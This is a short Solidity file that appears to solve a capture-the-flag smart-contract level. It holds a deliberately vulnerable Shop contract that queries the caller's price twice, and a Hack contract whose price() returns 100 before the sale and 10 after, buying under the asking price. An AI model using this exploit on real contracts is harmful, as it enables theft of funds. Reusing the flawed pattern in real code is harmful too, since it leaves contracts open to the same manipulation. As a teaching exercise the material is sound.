// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Hack {

    Shop public immutable target;

    constructor(address _target) {
        target = Shop(_target);
    }

    function attack() public {
        target.buy();
        require(target.price() == 10, "Not hacked");
    }

    function price() external view returns(uint) {
        if (target.isSold()) return 10;
        else return 100;
    }
}